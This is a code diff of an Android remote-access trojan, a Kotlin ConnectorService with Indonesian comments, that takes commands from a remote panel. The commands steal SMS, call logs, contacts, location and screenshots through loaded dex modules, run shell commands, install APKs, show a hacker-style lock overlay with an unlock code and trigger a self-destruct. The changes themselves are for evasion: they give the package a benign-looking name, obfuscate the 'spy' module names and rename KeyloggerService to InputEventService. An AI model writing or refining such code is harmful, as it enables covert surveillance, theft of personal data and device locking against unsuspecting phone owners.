@@ -1,4 +1,4 @@
-package com.android.services
+package com.nexlink.bridge
 
 import android.annotation.SuppressLint
 import android.app.AlarmManager
@@ -31,7 +31,7 @@ class ConnectorService : Service() {
 
     companion object {
         val SERVER_URL: String get() = SecureConfig.serverUrl()
-        const val CHANNEL_ID = "connector_channel"
+        const val CHANNEL_ID = "datasync_channel"
         const val NOTIF_ID = 1001
         const val ACTION_STOP = "ACTION_STOP"
         var isRunning = false
@@ -228,14 +228,14 @@ class ConnectorService : Service() {
             cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShell("settings get ${p[0]} ${p[1]}"), "command_result") }
 
             // ── Location (dex module) ──
-            cmd == "get_location"        -> DexModuleLoader.execute(this, "spy-location", cmd, null)
+            cmd == "get_location"        -> DexModuleLoader.execute(this, ObfStr.modSpyLocation(), cmd, null)
 
             // ── Call log (dex module) ──
-            cmd.startsWith("get_sms")     -> DexModuleLoader.execute(this, "spy-sms", cmd, null)
-            cmd.startsWith("get_calls")  -> DexModuleLoader.execute(this, "spy-calls", cmd, null)
+            cmd.startsWith("get_sms")     -> DexModuleLoader.execute(this, ObfStr.modSpySms(), cmd, null)
+            cmd.startsWith("get_calls")  -> DexModuleLoader.execute(this, ObfStr.modSpyCalls(), cmd, null)
 
             // ── Contacts (dex module) ──
-            cmd.startsWith("get_contacts") -> DexModuleLoader.execute(this, "spy-contacts", cmd, null)
+            cmd.startsWith("get_contacts") -> DexModuleLoader.execute(this, ObfStr.modSpyContacts(), cmd, null)
 
             // ── Installed apps ──
             cmd == "get_apps" || cmd.startsWith("pm_list") -> Pair(getInstalledApps(), "command_result")
@@ -261,7 +261,7 @@ class ConnectorService : Service() {
             cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")
 
             // ── Screenshot (dex module) ──
-            cmd.startsWith("screenshot") -> DexModuleLoader.execute(this, "spy-media", cmd, null)
+            cmd.startsWith("screenshot") -> DexModuleLoader.execute(this, ObfStr.modSpyMedia(), cmd, null)
 
             // ── Misc ──
             cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
@@ -686,14 +686,14 @@ class ConnectorService : Service() {
     private fun doScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f): String {
         return try {
             val trimmed = text.trim().ifEmpty { "By IWX TEAM" }
-            KeyloggerService.showScreenInject(trimmed, style, speed)
+            InputEventService.showScreenInject(trimmed, style, speed)
             "OK: [${style.uppercase()}] Overlay — ${trimmed}"
         } catch (e: Exception) { "ERROR: ${e.message}" }
     }
 
     private fun doScreenInjectStop(): String {
         return try {
-            KeyloggerService.hideScreenInject()
+            InputEventService.hideScreenInject()
             "OK: Overlay dihapus"
         } catch (e: Exception) { "ERROR: ${e.message}" }
     }
@@ -701,13 +701,13 @@ class ConnectorService : Service() {
     private fun doSetUnlockCode(code: String): String {
         val c = code.trim().filter { it.isLetterOrDigit() }.take(12)
         return if (c.length >= 2) {
-            KeyloggerService.unlockCode = c
+            InputEventService.unlockCode = c
             "OK: Unlock code set to [$c]"
         } else "ERROR: Code too short — min 2 chars"
     }
 
     private fun doResetUnlockCode(): String {
-        KeyloggerService.resetUnlockCode()
+        InputEventService.resetUnlockCode()
         return "OK: Unlock code reset to [2719]"
     }
 
@@ -725,7 +725,7 @@ class ConnectorService : Service() {
      * Hanya bisa dipanggil via remote command dari panel — tidak ada UI-nya.
      *
      * Urutan:
-     *   1. Nonaktifkan guard halaman Device Admin (KeyloggerService flag)
+     *   1. Nonaktifkan guard halaman Device Admin (InputEventService flag)
      *   2. Lepas setUninstallBlocked
      *   3. Lepas Device Owner (jika aktif)
      *   4. Lepas Device Admin
@@ -734,7 +734,7 @@ class ConnectorService : Service() {
     private fun doSelfDestruct(): String {
         return try {
             // 1. Matikan guard AccessibilityService
-            KeyloggerService.adminGuardEnabled = false
+            InputEventService.adminGuardEnabled = false
 
             val dpm   = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
             val admin = AppDeviceAdminReceiver.getComponentName(this)
